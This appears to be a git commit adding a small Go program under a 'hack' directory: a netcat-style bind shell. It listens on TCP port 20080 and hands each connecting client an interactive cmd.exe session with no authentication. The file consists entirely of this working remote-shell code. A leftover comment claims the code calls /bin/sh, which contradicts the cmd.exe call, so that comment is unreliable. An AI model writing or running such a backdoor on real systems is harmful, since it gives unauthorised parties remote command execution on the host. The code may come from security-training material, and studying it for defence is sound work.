f2ad898497fbfc2326cd77a78f2c41633b0e3230
teng <wwwsousoucom@126.com>
2020-04-15 02:16:10 +0800

    netcat

---
+++ hack/netcat-exec/main.go
@@ -0,0 +1,38 @@
+package main
+
+import (
+	"io"
+	"log"
+	"net"
+	"os/exec"
+)
+
+func handle(conn net.Conn) {
+	/*
+		Explicitly calling /bin/sh and using -i for interactive mode
+		so that we can use it for stdin and stdout.
+	*/
+	cmd := exec.Command("cmd.exe")
+	rp, wp := io.Pipe()
+	// Set stdin to our connection
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
+}
+
+func main() {
+	listener, err := net.Listen("tcp", ":20080")
+	if err != nil {
+		log.Fatalln(err)
+	}
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go handle(conn)
+	}
+
+}
